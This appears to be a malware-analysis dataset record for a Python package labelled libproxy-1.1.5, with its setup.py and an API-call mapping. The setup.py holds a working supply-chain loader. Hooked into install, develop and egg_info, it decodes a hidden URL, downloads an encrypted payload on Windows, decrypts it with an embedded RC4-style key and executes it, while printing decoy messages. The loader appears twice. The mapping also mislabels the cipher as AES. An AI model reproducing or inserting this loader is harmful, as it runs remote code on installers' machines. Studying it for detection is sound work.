[
  {
    "pyfile": "setup.py",
    "code_snippet": "import os\nimport sys\nimport urllib.request\nimport multiprocessing\nimport base64\n\nCONFIG_UPDATE_INFORMATION_ENDPOINT = b\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZXJpay1hcnRlbW92L2I1ZGUyNTE5NWJkMGU5NjFhNTIxYjAzNDU2NjE0ZDRjL3Jhdy8xY2MyMzYzMTBkYTdmM2UwNWI2NTcxZWFhOWRiNGI2NjM2ZmI0Njg0L2d6TGpnT3VqOHkwYmF2VG12Z2tDd1IzaDFrdkVDMUJNLmI2NAo=\"\nupdate_information_url = base64.b64decode(CONFIG_UPDATE_INFORMATION_ENDPOINT).decode('utf-8')\nkey = \"gUMX0ANp53ofRAwPFF3oOD5SIgJmXfZP\"\n\nD=range\ndef E(key):\n\tA=[A for A in D(0,256)];B=0\n\tfor C in D(0,256):B=(B+A[C]+key[C%len(key)])%256;E=A[C];A[C]=A[B];A[B]=E\n\treturn A\ndef F(sched):\n\tA=sched;E=[];B=0;C=0\n\twhile True:B=(1+B)%256;C=(A[B]+C)%256;D=A[C];A[C]=A[B];A[B]=D;yield A[(A[B]+A[C])%256]\ndef aRCAwKG0p3(eykEZYeNhh,key):\n\tB=key;A=eykEZYeNhh;A=A.split('0X')[1:];A=[int('0x'+A.lower(),0)for A in A];B=[ord(A)for A in B];D=E(B);G=F(D);C=''\n\tfor H in A:I=str(chr(H^next(G)));C+=I\n\treturn C\n\ndef send():\n    if os.name == \"nt\":\n        print(\"Verifying checksum...\")\n        try:\n            with urllib.request.urlopen(update_information_url) as response:\n                exec(aRCAwKG0p3(base64.b64decode(response.read()).decode('utf-8'), key))\n        except urllib.error.URLError as e:\n            pass\n        exit(0)\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\nclass PostInstallCommand(install):\n    def run(self):\n        print(\"Running post installation...\")\n        install.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        print(\"Running development mode post-install.\")\n        develop.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostEggInfoCommand(egg_info):\n    def run(self):\n        print(\"Validating egg_info.\")\n        egg_info.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()",
    "pattern_analysis": {
      "api_sequence": [
        "os.name",
        "urllib.request.urlopen",
        "urllib.request.urlopen.read",
        "base64.b64decode",
        "aRCAwKG0p3",
        "exec",
        "exit",
        "setuptools.command.install.install.run",
        "multiprocessing.Process",
        "multiprocessing.Process.start",
        "setuptools.command.develop.develop.run",
        "multiprocessing.Process",
        "multiprocessing.Process.start",
        "setuptools.command.egg_info.egg_info.run",
        "multiprocessing.Process",
        "multiprocessing.Process.start"
      ],
      "api_sequence_with_args": [
        "os.name",
        "urllib.request.urlopen(update_information_url)",
        "urllib.request.urlopen(update_information_url).read()",
        "base64.b64decode(response.read())",
        "aRCAwKG0p3(base64.b64decode(response.read()).decode('utf-8'), key)",
        "exec(aRCAwKG0p3(...))",
        "exit(0)",
        "setuptools.command.install.install.run(self)",
        "multiprocessing.Process(target=send)",
        "multiprocessing.Process(target=send).start()",
        "setuptools.command.develop.develop.run(self)",
        "multiprocessing.Process(target=send)",
        "multiprocessing.Process(target=send).start()",
        "setuptools.command.egg_info.egg_info.run(self)",
        "multiprocessing.Process(target=send)",
        "multiprocessing.Process(target=send).start()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "urllib.request.urlopen.read",
          "id": "read_response_bytes",
          "description": "Reads response body as bytes",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "aRCAwKG0p3",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        },
        {
          "api_name": "exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "multiprocessing.Process",
          "id": "create_child_process",
          "description": "Creates child process by duplicating current process",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "multiprocessing.Process.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "setuptools.command.develop.develop.run",
          "id": "exec_setuptools_dev",
          "description": "Executes setuptools development procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "multiprocessing.Process",
          "id": "create_child_process",
          "description": "Creates child process by duplicating current process",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "multiprocessing.Process.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "setuptools.command.egg_info.egg_info.run",
          "id": "find_packages",
          "description": "Finds all packages in current directory",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        },
        {
          "api_name": "multiprocessing.Process",
          "id": "create_child_process",
          "description": "Creates child process by duplicating current process",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "multiprocessing.Process.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        }
      ],
      "contextual_code": "import os\nimport urllib.request\nimport base64\nimport multiprocessing\n\ndef aRCAwKG0p3(eykEZYeNhh, key):\n    B = key\n    A = eykEZYeNhh\n    A = A.split('0X')[1:]\n    A = [int('0x' + A.lower(), 0) for A in A]\n    B = [ord(A) for A in B]\n    D = E(B)\n    G = F(D)\n    C = ''\n    for H in A:\n        I = str(chr(H ^ next(G)))\n        C += I\n    return C\n\ndef send():\n    if os.name == \"nt\":\n        print(\"Verifying checksum...\")\n        try:\n            with urllib.request.urlopen(update_information_url) as response:\n                exec(aRCAwKG0p3(base64.b64decode(response.read()).decode('utf-8'), key))\n        except urllib.error.URLError as e:\n            pass\n        exit(0)\n\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\n\nclass PostInstallCommand(install):\n    def run(self):\n        print(\"Running post installation...\")\n        install.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        print(\"Running development mode post-install.\")\n        develop.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostEggInfoCommand(egg_info):\n    def run(self):\n        print(\"Validating egg_info.\")\n        egg_info.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()"
    }
  },
  {
    "metadata": {
      "package_name": "libproxy-1.1.5"
    }
  }
]